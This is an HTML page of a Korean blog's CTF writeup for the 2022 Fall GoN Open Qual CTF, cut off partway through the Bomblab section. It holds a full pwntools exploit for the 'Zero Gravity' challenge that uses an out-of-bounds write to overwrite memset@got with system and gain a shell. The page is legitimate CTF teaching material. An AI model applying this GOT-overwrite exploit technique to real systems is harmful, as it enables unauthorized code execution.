@@ -1,0 +1,1453 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>2022 Fall GoN Open Qual CTF Writeup | imssm99 Blog</title>
+<meta name="keywords" content="ctf, writeup">
+<meta name="description" content="2022 Fall Gon Open Qual CTF
+imssm99 (2nd, 11427 pts)
+A. Zero Gravity Vulnerability idx를 입력받을 때 값을 검사하지 않아 OOB가 일어나게 된다. a, r을 통해 임의의 주소에 float 형식으로 값을 더하거나 읽을 수 있다.
+cnt = 1; for ( i = 0; i &lt; cnt; &#43;&#43;i ) { printf(&#34;(r)ead / (a)dd &gt;&gt; &#34;); scanf(&#34;%2s&#34;, &amp;s); if ( (char)s == &#39;a&#39; ) { printf(&#34; idx &gt;&gt; &#34;); scanf(&#34;%d&#34;, &amp;idx); printf(&#34; value &gt;&gt; &#34;); scanf(&#34;%f&#34;, &amp;value); arr[idx] = value &#43; arr[idx]; } else if ( (char)s == &#39;r&#39; ) { printf(&#34; idx &gt;&gt; &#34;); scanf(&#34;%d&#34;, &amp;idx); printf(&#34;%.">
+<meta name="author" content="imssm99">
+<link rel="canonical" href="https://blog.imssm99.kr/ctf/gon_openqual_2022_fall/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.e85ad0406048e8176e1c7661b25d5c69297ddfe41dc4124cf75ecb99a4f7b3d1.js" integrity="sha256-6FrQQGBI6BduHHZhsl1caSl93&#43;QdxBJM917LmaT3s9E="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://blog.imssm99.kr/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://blog.imssm99.kr/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://blog.imssm99.kr/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://blog.imssm99.kr/apple-touch-icon.png">
+<link rel="mask-icon" href="https://blog.imssm99.kr/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-HS7MTQNBY5"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-HS7MTQNBY5', { 'anonymize_ip': false });
+}
+</script>
+<meta property="og:title" content="2022 Fall GoN Open Qual CTF Writeup" />
+<meta property="og:description" content="2022 Fall Gon Open Qual CTF
+imssm99 (2nd, 11427 pts)
+A. Zero Gravity Vulnerability idx를 입력받을 때 값을 검사하지 않아 OOB가 일어나게 된다. a, r을 통해 임의의 주소에 float 형식으로 값을 더하거나 읽을 수 있다.
+cnt = 1; for ( i = 0; i &lt; cnt; &#43;&#43;i ) { printf(&#34;(r)ead / (a)dd &gt;&gt; &#34;); scanf(&#34;%2s&#34;, &amp;s); if ( (char)s == &#39;a&#39; ) { printf(&#34; idx &gt;&gt; &#34;); scanf(&#34;%d&#34;, &amp;idx); printf(&#34; value &gt;&gt; &#34;); scanf(&#34;%f&#34;, &amp;value); arr[idx] = value &#43; arr[idx]; } else if ( (char)s == &#39;r&#39; ) { printf(&#34; idx &gt;&gt; &#34;); scanf(&#34;%d&#34;, &amp;idx); printf(&#34;%." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.imssm99.kr/ctf/gon_openqual_2022_fall/" /><meta property="article:section" content="ctf" />
+<meta property="article:published_time" content="2022-09-01T20:00:00&#43;09:00" />
+<meta property="article:modified_time" content="2022-09-01T20:00:00&#43;09:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="2022 Fall GoN Open Qual CTF Writeup"/>
+<meta name="twitter:description" content="2022 Fall Gon Open Qual CTF
+imssm99 (2nd, 11427 pts)
+A. Zero Gravity Vulnerability idx를 입력받을 때 값을 검사하지 않아 OOB가 일어나게 된다. a, r을 통해 임의의 주소에 float 형식으로 값을 더하거나 읽을 수 있다.
+cnt = 1; for ( i = 0; i &lt; cnt; &#43;&#43;i ) { printf(&#34;(r)ead / (a)dd &gt;&gt; &#34;); scanf(&#34;%2s&#34;, &amp;s); if ( (char)s == &#39;a&#39; ) { printf(&#34; idx &gt;&gt; &#34;); scanf(&#34;%d&#34;, &amp;idx); printf(&#34; value &gt;&gt; &#34;); scanf(&#34;%f&#34;, &amp;value); arr[idx] = value &#43; arr[idx]; } else if ( (char)s == &#39;r&#39; ) { printf(&#34; idx &gt;&gt; &#34;); scanf(&#34;%d&#34;, &amp;idx); printf(&#34;%."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "CTF",
+      "item": "https://blog.imssm99.kr/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "2022 Fall GoN Open Qual CTF Writeup",
+      "item": "https://blog.imssm99.kr/ctf/gon_openqual_2022_fall/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2022 Fall GoN Open Qual CTF Writeup",
+  "name": "2022 Fall GoN Open Qual CTF Writeup",
+  "description": "2022 Fall Gon Open Qual CTF\nimssm99 (2nd, 11427 pts)\nA. Zero Gravity Vulnerability idx를 입력받을 때 값을 검사하지 않아 OOB가 일어나게 된다. a, r을 통해 임의의 주소에 float 형식으로 값을 더하거나 읽을 수 있다.\ncnt = 1; for ( i = 0; i \u0026lt; cnt; ++i ) { printf(\u0026#34;(r)ead / (a)dd \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%2s\u0026#34;, \u0026amp;s); if ( (char)s == \u0026#39;a\u0026#39; ) { printf(\u0026#34; idx \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;idx); printf(\u0026#34; value \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%f\u0026#34;, \u0026amp;value); arr[idx] = value + arr[idx]; } else if ( (char)s == \u0026#39;r\u0026#39; ) { printf(\u0026#34; idx \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;idx); printf(\u0026#34;%.",
+  "keywords": [
+    "ctf", "writeup"
+  ],
+  "articleBody": " 2022 Fall Gon Open Qual CTF\nimssm99 (2nd, 11427 pts)\nA. Zero Gravity Vulnerability idx를 입력받을 때 값을 검사하지 않아 OOB가 일어나게 된다. a, r을 통해 임의의 주소에 float 형식으로 값을 더하거나 읽을 수 있다.\ncnt = 1; for ( i = 0; i \u003c cnt; ++i ) { printf(\"(r)ead / (a)dd \u003e\u003e \"); scanf(\"%2s\", \u0026s); if ( (char)s == 'a' ) { printf(\" idx \u003e\u003e \"); scanf(\"%d\", \u0026idx); printf(\" value \u003e\u003e \"); scanf(\"%f\", \u0026value); arr[idx] = value + arr[idx]; } else if ( (char)s == 'r' ) { printf(\" idx \u003e\u003e \"); scanf(\"%d\", \u0026idx); printf(\"%.10e\\n\", arr[idx]); } memset(\u0026s, 0, 3uLL); } /* .got.plt:0x601028 = memset .got.plt:0x601030 = setvbuf .bss:0x6010A0 = arr .bss:0x6010E0 = cnt */ Exploit 먼저 cnt를 조작하여 for loop가 여러 번 돌도록 한다. arr[-28]을 읽어 setvbuf@got의 lower 4byte를 읽어 system함수의 주소를 알아낸다. arr[-30]에 값을 더해 memset@got를 system함수의 주소로 덮어쓴다. memset(\u0026s, 0, 3uLL)에서 system(\u0026s)가 실행되어 원하는 명령을 입력할 수 있다. from pwn import * import struct itof = lambda x: struct.unpack(\"",
+  "wordCount" : "3881",
+  "inLanguage": "en",
+  "datePublished": "2022-09-01T20:00:00+09:00",
+  "dateModified": "2022-09-01T20:00:00+09:00",
+  "author":{
+    "@type": "Person",
+    "name": "imssm99"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://blog.imssm99.kr/ctf/gon_openqual_2022_fall/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "imssm99 Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://blog.imssm99.kr/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://blog.imssm99.kr/" accesskey="h" title="imssm99 Blog (Alt + H)">imssm99 Blog</a>
+            <span class="logo-switches">
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://blog.imssm99.kr/aboutme/" title="About Me">
+                    <span>About Me</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.imssm99.kr/archives/" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.imssm99.kr/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.imssm99.kr/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      2022 Fall GoN Open Qual CTF Writeup
+    </h1>
+    <div class="post-meta"><span title='2022-09-01 20:00:00 +0900 KST'>September 1, 2022</span>&nbsp;·&nbsp;imssm99
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#a-zero-gravity" aria-label="A. Zero Gravity">A. Zero Gravity</a><ul>
+                        
+                <li>
+                    <a href="#vulnerability" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#exploit" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#b-bomblab---hard" aria-label="B. Bomblab - Hard">B. Bomblab - Hard</a><ul>
+                        
+                <li>
+                    <a href="#level-1" aria-label="Level 1">Level 1</a></li>
+                <li>
+                    <a href="#level-2" aria-label="Level 2">Level 2</a></li>
+                <li>
+                    <a href="#level-3" aria-label="Level 3">Level 3</a></li>
+                <li>
+                    <a href="#level-4" aria-label="Level 4">Level 4</a></li>
+                <li>
+                    <a href="#level-5" aria-label="Level 5">Level 5</a></li>
+                <li>
+                    <a href="#level-6" aria-label="Level 6">Level 6</a></li>
+                <li>
+                    <a href="#secret-phase" aria-label="Secret Phase">Secret Phase</a></li>
+                <li>
+                    <a href="#secret-phase-2" aria-label="Secret Phase 2">Secret Phase 2</a></li>
+                <li>
+                    <a href="#solution" aria-label="Solution">Solution</a></li></ul>
+                </li>
+                <li>
+                    <a href="#c-pprintable" aria-label="C. pprintable">C. pprintable</a><ul>
+                        
+                <li>
+                    <a href="#solution-1" aria-label="Solution">Solution</a></li></ul>
+                </li>
+                <li>
+                    <a href="#d-obstacle" aria-label="D. Obstacle">D. Obstacle</a><ul>
+                        
+                <li>
+                    <a href="#solution-2" aria-label="Solution">Solution</a></li></ul>
+                </li>
+                <li>
+                    <a href="#g-emerald-tablet" aria-label="G. Emerald Tablet">G. Emerald Tablet</a><ul>
+                        
+                <li>
+                    <a href="#vulnerability-1" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#exploit-1" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#k-dlmalloc" aria-label="K. dlmalloc">K. dlmalloc</a><ul>
+                        
+                <li>
+                    <a href="#vulnerability-2" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#exploit-2" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#l-baby-hexagon" aria-label="L. baby-hexagon">L. baby-hexagon</a><ul>
+                        
+                <li>
+                    <a href="#vulnerability-3" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#exploit-3" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#m-cheat" aria-label="M. cheat">M. cheat</a><ul>
+                        
+                <li>
+                    <a href="#vulnerability-4" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#exploit-4" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#n-private-storage" aria-label="N. Private Storage">N. Private Storage</a><ul>
+                        
+                <li>
+                    <a href="#vulnerability-5" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#exploit-5" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#o-checkers" aria-label="O. Checkers">O. Checkers</a><ul>
+                        
+                <li>
+                    <a href="#vulnerability-6" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#exploit-6" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#p-farmer" aria-label="P. farmer">P. farmer</a><ul>
+                        
+                <li>
+                    <a href="#solution-3" aria-label="Solution">Solution</a></li></ul>
+                </li>
+                <li>
+                    <a href="#q-api-portal" aria-label="Q. API Portal">Q. API Portal</a><ul>
+                        
+                <li>
+                    <a href="#vulnerability-7" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#solution-4" aria-label="Solution">Solution</a></li></ul>
+                </li>
+                <li>
+                    <a href="#r-100-100" aria-label="R. 100-100">R. 100-100</a><ul>
+                        
+                <li>
+                    <a href="#vulnerability-8" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#solution-5" aria-label="Solution">Solution</a></li></ul>
+                </li>
+                <li>
+                    <a href="#s-sleepingshark" aria-label="S. sleepingshark">S. sleepingshark</a></li>
+                <li>
+                    <a href="#t-survey%ec%84%a4%eb%ac%b8%ec%a1%b0%ec%82%ac" aria-label="T. Survey/설문조사">T. Survey/설문조사</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><blockquote>
+<p><a href="https://dreamhack.io/ctf/39">2022 Fall Gon Open Qual CTF</a><br>
+imssm99 (2nd, 11427 pts)</p>
+</blockquote>
+<h2 id="a-zero-gravity">A. Zero Gravity<a hidden class="anchor" aria-hidden="true" href="#a-zero-gravity">#</a></h2>
+<h3 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h3>
+<p><code>idx</code>를 입력받을 때 값을 검사하지 않아 OOB가 일어나게 된다.
+<code>a</code>, <code>r</code>을 통해 임의의 주소에 float 형식으로 값을 더하거나 읽을 수 있다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> cnt; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;(r)ead / (a)dd &gt;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;%2s&#34;</span>, <span style="color:#f92672">&amp;</span>s);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">char</span>)s <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;a&#39;</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34; idx &gt;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>        scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34; value &gt;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>        scanf(<span style="color:#e6db74">&#34;%f&#34;</span>, <span style="color:#f92672">&amp;</span>value);
+</span></span><span style="display:flex;"><span>        arr[idx] <span style="color:#f92672">=</span> value <span style="color:#f92672">+</span> arr[idx];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">char</span>)s <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34; idx &gt;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>        scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;%.10e</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, arr[idx]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3uLL</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">.got.plt:0x601028 = memset
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">.got.plt:0x601030 = setvbuf
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">.bss:0x6010A0 = arr
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">.bss:0x6010E0 = cnt
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span></code></pre></div><h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
+<ul>
+<li>먼저 <code>cnt</code>를 조작하여 for loop가 여러 번 돌도록 한다.</li>
+<li><code>arr[-28]</code>을 읽어 <code>setvbuf@got</code>의 lower 4byte를 읽어 <code>system</code>함수의 주소를 알아낸다.</li>
+<li><code>arr[-30]</code>에 값을 더해 <code>memset@got</code>를 <code>system</code>함수의 주소로 덮어쓴다.</li>
+<li><code>memset(&amp;s, 0, 3uLL)</code>에서 <code>system(&amp;s)</code>가 실행되어 원하는 명령을 입력할 수 있다.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>itof <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;f&#34;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, x))[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>ftoi <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;f&#34;</span>, x))[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./zero_gravity&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;host1.dreamhack.games&#34;</span>, <span style="color:#ae81ff">20267</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#34;./zero_gravity&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read</span>(idx):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;r&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ftoi(float(p<span style="color:#f92672">.</span>recvline()))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(idx, value):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, str(value)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0x10</span>) <span style="color:#75715e"># cnt+=0x10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>l <span style="color:#f92672">=</span> read(<span style="color:#f92672">-</span><span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>lp <span style="color:#f92672">=</span> itof(l)
+</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> read(<span style="color:#f92672">-</span><span style="color:#ae81ff">28</span>) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;setvbuf&#34;</span>] <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>tp <span style="color:#f92672">=</span> itof(t)
+</span></span><span style="display:flex;"><span>print(hex(l), lp)
+</span></span><span style="display:flex;"><span>print(hex(t), tp)
+</span></span><span style="display:flex;"><span>add(<span style="color:#f92672">-</span><span style="color:#ae81ff">30</span>, tp<span style="color:#f92672">-</span>lp)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(hex(read(<span style="color:#f92672">-</span><span style="color:#ae81ff">30</span>)))
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<h2 id="b-bomblab---hard">B. Bomblab - Hard<a hidden class="anchor" aria-hidden="true" href="#b-bomblab---hard">#</a></h2>
+<p>Level 1 ~ Level 6은 정적 분석을 통해 풀었고, Secret Phase는 Binary Patch를 통해 디버거 탐지를 우회한 뒤 GDB를 이용해 동적으로 분석했다.</p>
+<h3 id="level-1">Level 1<a hidden class="anchor" aria-hidden="true" href="#level-1">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>a <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;839C8982939F899F8D8189&#34;</span>)
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> bytes([x<span style="color:#f92672">^</span><span style="color:#ae81ff">0xCC</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> a])
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] level 1:&#34;</span>, code)
+</span></span></code></pre></div><h3 id="level-2">Level 2<a hidden class="anchor" aria-hidden="true" href="#level-2">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>a <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>a[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">6</span>):
+</span></span><span style="display:flex;"><span>    a[i] <span style="color:#f92672">=</span> ( ((i<span style="color:#f92672">*</span>(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> a[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> a[i] <span style="color:#f92672">==</span> ( ((i<span style="color:#f92672">*</span>(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> a[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] )
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] level 2:&#34;</span>, <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>join(map(str, a)))
+</span></span></code></pre></div><h3 id="level-3">Level 3<a hidden class="anchor" aria-hidden="true" href="#level-3">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>a <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xDEADBEEF</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> a <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xDEADBEEE</span>
+</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">327871</span> <span style="color:#f92672">*</span> ((<span style="color:#ae81ff">450357013</span> <span style="color:#f92672">*</span> a) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">53</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">61</span> <span style="color:#f92672">+</span> a
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> (a <span style="color:#f92672">-</span> b) <span style="color:#f92672">//</span> <span style="color:#ae81ff">0x3D</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">327871</span> <span style="color:#f92672">*</span> ((<span style="color:#ae81ff">450357013</span> <span style="color:#f92672">*</span> a) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">53</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] level 3:&#34;</span>, a, b)
+</span></span></code></pre></div><h3 id="level-4">Level 4<a hidden class="anchor" aria-hidden="true" href="#level-4">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>a, b <span style="color:#f92672">=</span> <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">456</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> a <span style="color:#f92672">&gt;=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> b <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> a<span style="color:#f92672">**</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">*</span>(a<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">*</span>b <span style="color:#f92672">+</span> b<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">208398105</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] level 4:&#34;</span>, a, b)
+</span></span></code></pre></div><h3 id="level-5">Level 5<a hidden class="anchor" aria-hidden="true" href="#level-5">#</a></h3>
